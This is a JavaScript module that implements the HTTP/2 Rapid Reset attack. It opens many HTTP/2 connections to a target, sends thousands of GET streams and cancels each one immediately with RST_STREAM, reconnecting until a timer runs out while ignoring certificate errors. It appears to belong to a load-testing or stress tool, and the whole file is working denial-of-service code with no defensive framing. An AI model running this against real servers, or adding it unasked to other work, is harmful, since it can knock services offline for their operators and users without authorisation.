import http2 from 'http2';

export async function runHttp2RapidReset(target, config, durationSeconds) {
  const {
    connections            = 10,
    streams_per_connection = 1000,
  } = config;

  const endTime = Date.now() + durationSeconds * 1000;
  let totalStreams = 0, errors = 0;

  function runWorker() {
    return new Promise((resolve) => {
      function nextSession() {
        if (Date.now() >= endTime) return resolve();

        const session = http2.connect(target, {
          rejectUnauthorized: false,
          settings: { initialWindowSize: 65535 },
        });

        session.on('error', () => { if (Date.now() < endTime) nextSession(); else resolve(); });
        session.on('close', () => { if (Date.now() < endTime) nextSession(); else resolve(); });

        session.once('connect', () => {
          let sent = 0;
          function sendBatch() {
            while (Date.now() < endTime && !session.destroyed && sent < streams_per_connection) {
              try {
                const req = session.request({ ':method': 'GET', ':path': '/' });
                totalStreams++;
                sent++;
                req.rstStream(8);
                req.on('error', () => {});
              } catch {
                errors++;
                break;
              }
            }
            if (!session.destroyed && Date.now() < endTime && sent < streams_per_connection) {
              setImmediate(sendBatch);
            } else {
              session.destroy();
            }
          }
          sendBatch();
        });
      }
      nextSession();
    });
  }

  await Promise.all(Array.from({ length: connections }, runWorker));

  return {
    avgLatencyMs      : 0,
    errorRateBps      : totalStreams > 0 ? Math.round((errors / totalStreams) * 10000) : 10_000,
    requestsCompleted : totalStreams,
  };
}
